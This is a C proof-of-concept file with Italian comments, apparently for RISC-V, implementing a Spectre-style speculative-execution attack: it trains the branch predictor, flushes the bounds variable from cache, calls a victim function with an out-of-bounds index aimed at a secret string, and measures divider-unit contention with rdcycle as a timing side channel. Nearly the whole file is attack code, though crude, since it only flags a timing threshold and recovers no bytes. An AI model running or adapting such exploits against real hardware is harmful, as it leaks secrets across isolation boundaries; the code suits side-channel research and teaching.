#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define THRESHOLD 50  // Soglia da determinare sperimentalmente
#define NUM_TRAIN 100 // Addestramento del branch predictor

uint64_t array1_size = 16;
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
char* secret = "SecretValue";
volatile uint64_t temp; // Variabile volatile per forzare l'ottimizzazione

void victim_function(size_t idx) {
    if (idx < array1_size) {
        uint64_t value = array1[idx];
        // Operazione di divisione speculativa
        asm volatile(
            "div %[res], %[val], %[div]\n"
            : [res] "=r"(temp)
            : [val] "r"(value), [div] "r"(123)
        );
    }
}

void attacker() {
    uint64_t start, duration;
    
    // Addestramento branch predictor
    for (int i = 0; i < NUM_TRAIN; i++) {
        victim_function(i % array1_size);
    }

    // Flush della cache per ritardare il bound check
    flushCache((uint64_t)&array1_size, sizeof(array1_size));

    // Indice malizioso basato sul segreto
    size_t malicious_idx = (size_t)(secret - (char*)array1);

    // Esecuzione speculativa
    victim_function(malicious_idx);

    // Misurazione contesa unità di divisione
    start = rdcycle();
    for (int i = 0; i < 20; i++) {
        asm volatile(
            "div a0, %[val], %[div]\n"
            :: [val] "r"(i+1), [div] "r"(123)
            : "a0"
        );
    }
    duration = rdcycle() - start;

    // Rilevamento dell'interferenza
    if (duration > THRESHOLD) {
        printf("Segreto influenzato: %lu cicli\n", duration);
    }
}

int main() {
    attacker();
    return 0;
}
